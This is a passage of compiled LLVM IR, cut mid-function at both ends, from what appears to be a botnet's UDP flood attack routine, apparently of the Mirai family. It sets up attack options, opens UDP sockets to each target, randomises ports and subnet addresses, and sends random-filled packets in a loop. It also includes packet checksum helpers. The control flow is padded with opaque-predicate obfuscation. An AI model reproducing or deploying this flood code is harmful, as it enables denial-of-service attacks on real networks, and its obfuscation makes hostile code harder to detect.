  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %250, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %253

; <label>:63:                                     ; preds = %58
  %64 = load i32, i32* @x.41
  %65 = load i32, i32* @y.42
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %63
  %72 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %73 = load i8**, i8*** %10, align 8
  %74 = load i32, i32* %9, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8*, i8** %73, i64 %75
  store i8* %72, i8** %76, align 8
  %77 = load i16, i16* %12, align 2
  %78 = zext i16 %77 to i32
  %79 = icmp eq i32 %78, 65535
  %80 = load i32, i32* @x.41
  %81 = load i32, i32* @y.42
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %79, label %88, label %113

; <label>:88:                                     ; preds = %originalBBpart2
  %89 = load i32, i32* @x.41
  %90 = load i32, i32* @y.42
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %88
  %97 = call i32 @rand_next()
  %98 = trunc i32 %97 to i16
  %99 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %100 = load i32, i32* %9, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %99, i64 %101
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %102, i32 0, i32 0
  %104 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %103, i32 0, i32 1
  store i16 %98, i16* %104, align 2
  %105 = load i32, i32* @x.41
  %106 = load i32, i32* @y.42
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %138

; <label>:113:                                    ; preds = %originalBBpart2
  %114 = load i32, i32* @x.41
  %115 = load i32, i32* @y.42
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %113
  %122 = load i16, i16* %12, align 2
  %123 = call zeroext i16 @htons(i16 zeroext %122) #7
  %124 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %125 = load i32, i32* %9, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %124, i64 %126
  %128 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %127, i32 0, i32 0
  %129 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %128, i32 0, i32 1
  store i16 %123, i16* %129, align 2
  %130 = load i32, i32* @x.41
  %131 = load i32, i32* @y.42
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %138

; <label>:138:                                    ; preds = %originalBBpart28, %originalBBpart24
  %139 = load i32, i32* @x.41
  %140 = load i32, i32* @y.42
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %138
  %147 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %148 = load i32*, i32** %11, align 8
  %149 = load i32, i32* %9, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds i32, i32* %148, i64 %150
  store i32 %147, i32* %151, align 4
  %152 = icmp eq i32 %147, -1
  %153 = load i32, i32* @x.41
  %154 = load i32, i32* @y.42
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %152, label %161, label %162

; <label>:161:                                    ; preds = %originalBBpart212
  ret void

; <label>:162:                                    ; preds = %originalBBpart212
  %163 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %163, align 4
  %164 = load i16, i16* %13, align 2
  %165 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %164, i16* %165, align 2
  %166 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %167 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %166, i32 0, i32 0
  store i32 0, i32* %167, align 4
  %168 = load i32*, i32** %11, align 8
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i32, i32* %168, i64 %170
  %172 = load i32, i32* %171, align 4
  %173 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %174 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %174, %struct.sockaddr** %173, align 8
  %175 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %176 = load %struct.sockaddr*, %struct.sockaddr** %175, align 8
  %177 = call i32 @bind(i32 %172, %struct.sockaddr* %176, i32 16) #6
  %178 = icmp eq i32 %177, -1
  br i1 %178, label %179, label %180

; <label>:179:                                    ; preds = %162
  br label %180

; <label>:180:                                    ; preds = %179, %162
  %181 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i64 %183
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i32 0, i32 2
  %186 = load i8, i8* %185, align 4
  %187 = zext i8 %186 to i32
  %188 = icmp slt i32 %187, 32
  br i1 %188, label %189, label %215

; <label>:189:                                    ; preds = %180
  %190 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %191 = load i32, i32* %9, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 1
  %195 = load i32, i32* %194, align 4
  %196 = call i32 @ntohl(i32 %195) #7
  %197 = call i32 @rand_next()
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 2
  %203 = load i8, i8* %202, align 4
  %204 = zext i8 %203 to i32
  %205 = lshr i32 %197, %204
  %206 = add i32 %196, %205
  %207 = call i32 @htonl(i32 %206) #7
  %208 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %209 = load i32, i32* %9, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i64 %210
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i32 0, i32 0
  %213 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %212, i32 0, i32 2
  %214 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %213, i32 0, i32 0
  store i32 %207, i32* %214, align 4
  br label %215

; <label>:215:                                    ; preds = %189, %180
  %216 = load i32*, i32** %11, align 8
  %217 = load i32, i32* %9, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds i32, i32* %216, i64 %218
  %220 = load i32, i32* %219, align 4
  %221 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %222 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %223 = load i32, i32* %9, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %222, i64 %224
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %225, i32 0, i32 0
  %227 = bitcast %struct.sockaddr_in* %226 to %struct.sockaddr*
  store %struct.sockaddr* %227, %struct.sockaddr** %221, align 8
  %228 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %229 = load %struct.sockaddr*, %struct.sockaddr** %228, align 8
  %230 = call i32 @connect(i32 %220, %struct.sockaddr* %229, i32 16)
  %231 = icmp eq i32 %230, -1
  br i1 %231, label %232, label %249

; <label>:232:                                    ; preds = %215
  %233 = load i32, i32* @x.41
  %234 = load i32, i32* @y.42
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %232
  %241 = load i32, i32* @x.41
  %242 = load i32, i32* @y.42
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %249

; <label>:249:                                    ; preds = %originalBBpart216, %215
  br label %250

; <label>:250:                                    ; preds = %249
  %251 = load i32, i32* %9, align 4
  %252 = add nsw i32 %251, 1
  store i32 %252, i32* %9, align 4
  br label %58

; <label>:253:                                    ; preds = %58
  br label %254

; <label>:254:                                    ; preds = %originalBBpart232, %253
  %255 = load i32, i32* @x.41
  %256 = load i32, i32* @y.42
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %254
  store i32 0, i32* %9, align 4
  %263 = load i32, i32* @x.41
  %264 = load i32, i32* @y.42
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %271

; <label>:271:                                    ; preds = %330, %originalBBpart220
  %272 = load i32, i32* %9, align 4
  %273 = load i8, i8* %5, align 1
  %274 = zext i8 %273 to i32
  %275 = icmp slt i32 %272, %274
  br i1 %275, label %276, label %333

; <label>:276:                                    ; preds = %271
  %277 = load i32, i32* @x.41
  %278 = load i32, i32* @y.42
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %276
  %285 = load i8**, i8*** %10, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds i8*, i8** %285, i64 %287
  %289 = load i8*, i8** %288, align 8
  store i8* %289, i8** %22, align 8
  %290 = load i8, i8* %15, align 1
  %291 = icmp ne i8 %290, 0
  %292 = load i32, i32* @x.41
  %293 = load i32, i32* @y.42
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %291, label %300, label %320

; <label>:300:                                    ; preds = %originalBBpart224
  %301 = load i32, i32* @x.41
  %302 = load i32, i32* @y.42
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %300
  %309 = load i8*, i8** %22, align 8
  %310 = load i16, i16* %14, align 2
  %311 = zext i16 %310 to i32
  call void @rand_str(i8* %309, i32 %311)
  %312 = load i32, i32* @x.41
  %313 = load i32, i32* @y.42
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %320

; <label>:320:                                    ; preds = %originalBBpart228, %originalBBpart224
  %321 = load i32*, i32** %11, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds i32, i32* %321, i64 %323
  %325 = load i32, i32* %324, align 4
  %326 = load i8*, i8** %22, align 8
  %327 = load i16, i16* %14, align 2
  %328 = zext i16 %327 to i64
  %329 = call i64 @send(i32 %325, i8* %326, i64 %328, i32 16384)
  br label %330

; <label>:330:                                    ; preds = %320
  %331 = load i32, i32* %9, align 4
  %332 = add nsw i32 %331, 1
  store i32 %332, i32* %9, align 4
  br label %271

; <label>:333:                                    ; preds = %271
  %334 = load i32, i32* @x.41
  %335 = load i32, i32* @y.42
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %333
  %342 = load i32, i32* @x.41
  %343 = load i32, i32* @y.42
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %254

originalBBalteredBB:                              ; preds = %originalBB, %63
  %350 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %351 = load i8**, i8*** %10, align 8
  %352 = load i32, i32* %9, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds i8*, i8** %351, i64 %353
  store i8* %350, i8** %354, align 8
  %355 = load i16, i16* %12, align 2
  %356 = zext i16 %355 to i32
  %357 = icmp eq i32 %356, 65535
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %88
  %358 = call i32 @rand_next()
  %359 = trunc i32 %358 to i16
  %360 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %361 = load i32, i32* %9, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %360, i64 %362
  %364 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %363, i32 0, i32 0
  %365 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %364, i32 0, i32 1
  store i16 %359, i16* %365, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %113
  %366 = load i16, i16* %12, align 2
  %367 = call zeroext i16 @htons(i16 zeroext %366) #7
  %368 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %369 = load i32, i32* %9, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i32 0, i32 0
  %373 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %372, i32 0, i32 1
  store i16 %367, i16* %373, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %138
  %374 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %375 = load i32*, i32** %11, align 8
  %376 = load i32, i32* %9, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds i32, i32* %375, i64 %377
  store i32 %374, i32* %378, align 4
  %379 = icmp eq i32 %374, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %232
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %254
  store i32 0, i32* %9, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %276
  %380 = load i8**, i8*** %10, align 8
  %381 = load i32, i32* %9, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds i8*, i8** %380, i64 %382
  %384 = load i8*, i8** %383, align 8
  store i8* %384, i8** %22, align 8
  %385 = load i8, i8* %15, align 1
  %386 = icmp ne i8 %385, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %300
  %387 = load i8*, i8** %22, align 8
  %388 = load i16, i16* %14, align 2
  %389 = zext i16 %388 to i32
  call void @rand_str(i8* %387, i32 %389)
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %333
  br label %originalBB30
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %16, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %19

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  br label %16

; <label>:16:                                     ; preds = %9
  %17 = load i32, i32* %4, align 4
  %18 = sub i32 %17, 2
  store i32 %18, i32* %4, align 4
  br label %6

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* %4, align 4
  %21 = icmp eq i32 %20, 1
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %19
  %23 = load i16*, i16** %3, align 8
  %24 = load i16, i16* %23, align 2
  %25 = trunc i16 %24 to i8
  %26 = sext i8 %25 to i64
  %27 = load i64, i64* %5, align 8
  %28 = add i64 %27, %26
  store i64 %28, i64* %5, align 8
  br label %29

; <label>:29:                                     ; preds = %22, %19
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = load i64, i64* %5, align 8
  %33 = and i64 %32, 65535
  %34 = add i64 %31, %33
  store i64 %34, i64* %5, align 8
  %35 = load i64, i64* %5, align 8
  %36 = lshr i64 %35, 16
  %37 = load i64, i64* %5, align 8
  %38 = add i64 %37, %36
  store i64 %38, i64* %5, align 8
  %39 = load i64, i64* %5, align 8
  %40 = xor i64 %39, -1
  %41 = trunc i64 %40 to i16
  ret i16 %41
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %originalBBpart26, %4
  %24 = load i32, i32* @x.45
  %25 = load i32, i32* @y.46
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %23
  %32 = load i32, i32* %8, align 4
  %33 = icmp sgt i32 %32, 1
  %34 = load i32, i32* @x.45
  %35 = load i32, i32* @y.46
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %33, label %42, label %68

; <label>:42:                                     ; preds = %originalBBpart2
  %43 = load i32, i32* @x.45
  %44 = load i32, i32* @y.46
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %42
  %51 = load i16*, i16** %9, align 8
  %52 = load i16, i16* %51, align 2
  %53 = zext i16 %52 to i32
  %54 = load i32, i32* %12, align 4
  %55 = add i32 %54, %53
  store i32 %55, i32* %12, align 4
  %56 = load i16*, i16** %9, align 8
  %57 = getelementptr inbounds i16, i16* %56, i32 1
  store i16* %57, i16** %9, align 8
  %58 = load i32, i32* %8, align 4
  %59 = sub nsw i32 %58, 2
  store i32 %59, i32* %8, align 4
  %60 = load i32, i32* @x.45
  %61 = load i32, i32* @y.46
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br label %23

; <label>:68:                                     ; preds = %originalBBpart2
  %69 = load i32, i32* %8, align 4
  %70 = icmp eq i32 %69, 1
  br i1 %70, label %71, label %78

; <label>:71:                                     ; preds = %68
  %72 = load i16*, i16** %9, align 8
  %73 = bitcast i16* %72 to i8*
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  %76 = load i32, i32* %12, align 4
  %77 = add i32 %76, %75
  store i32 %77, i32* %12, align 4
  br label %78

; <label>:78:                                     ; preds = %71, %68
  %79 = load i32, i32* %10, align 4
  %80 = lshr i32 %79, 16
  %81 = and i32 %80, 65535
  %82 = load i32, i32* %12, align 4
  %83 = add i32 %82, %81
  store i32 %83, i32* %12, align 4
  %84 = load i32, i32* %10, align 4
  %85 = and i32 %84, 65535
  %86 = load i32, i32* %12, align 4
  %87 = add i32 %86, %85
  store i32 %87, i32* %12, align 4
  %88 = load i32, i32* %11, align 4
  %89 = lshr i32 %88, 16
  %90 = and i32 %89, 65535
  %91 = load i32, i32* %12, align 4
  %92 = add i32 %91, %90
  store i32 %92, i32* %12, align 4
  %93 = load i32, i32* %11, align 4
  %94 = and i32 %93, 65535
  %95 = load i32, i32* %12, align 4
  %96 = add i32 %95, %94
  store i32 %96, i32* %12, align 4
  %97 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %98 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %97, i32 0, i32 6
  %99 = load i8, i8* %98, align 1
  %100 = zext i8 %99 to i16
  %101 = call zeroext i16 @htons(i16 zeroext %100) #7
  %102 = zext i16 %101 to i32
  %103 = load i32, i32* %12, align 4
  %104 = add i32 %103, %102
  store i32 %104, i32* %12, align 4
  %105 = load i16, i16* %7, align 2
  %106 = zext i16 %105 to i32
  %107 = load i32, i32* %12, align 4
  %108 = add i32 %107, %106
  store i32 %108, i32* %12, align 4
  br label %109

; <label>:109:                                    ; preds = %originalBBpart227, %78
  %110 = load i32, i32* %12, align 4
  %111 = lshr i32 %110, 16
  %112 = icmp ne i32 %111, 0
  br i1 %112, label %113, label %135

; <label>:113:                                    ; preds = %109
  %114 = load i32, i32* @x.45
  %115 = load i32, i32* @y.46
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %113
  %122 = load i32, i32* %12, align 4
  %123 = and i32 %122, 65535
  %124 = load i32, i32* %12, align 4
  %125 = lshr i32 %124, 16
  %126 = add i32 %123, %125
  store i32 %126, i32* %12, align 4
  %127 = load i32, i32* @x.45
  %128 = load i32, i32* @y.46
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart227, label %originalBB8alteredBB

originalBBpart227:                                ; preds = %originalBB8
  br label %109

; <label>:135:                                    ; preds = %109
  %136 = load i32, i32* %12, align 4
  %137 = xor i32 %136, -1
  %138 = trunc i32 %137 to i16
  ret i16 %138

originalBBalteredBB:                              ; preds = %originalBB, %23
  %139 = load i32, i32* %8, align 4
  %140 = icmp sgt i32 %139, 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %42
  %141 = load i16*, i16** %9, align 8
  %142 = load i16, i16* %141, align 2
  %143 = zext i16 %142 to i32
  %144 = load i32, i32* %12, align 4
  %_ = sub i32 0, %144
  %gen = add i32 %_, %143
  %_2 = sub i32 0, %144
  %gen3 = add i32 %_2, %143
  %145 = add i32 %144, %143
  store i32 %145, i32* %12, align 4
  %146 = load i16*, i16** %9, align 8
  %147 = getelementptr inbounds i16, i16* %146, i32 1
  store i16* %147, i16** %9, align 8
  %148 = load i32, i32* %8, align 4
  %_4 = shl i32 %148, 2
